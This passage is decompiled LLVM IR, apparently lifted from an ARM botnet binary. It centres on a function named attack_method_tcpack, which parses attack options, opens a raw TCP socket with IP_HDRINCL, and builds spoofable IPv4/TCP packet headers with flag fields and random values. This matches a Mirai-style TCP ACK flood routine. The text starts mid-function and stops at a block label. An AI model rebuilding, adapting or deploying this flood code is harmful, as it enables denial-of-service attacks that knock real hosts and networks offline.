  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 23, 15, 16, 13, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960), { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bae4 = load i32, i32* @sb, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* %sb.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* %sb.global-to-local, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
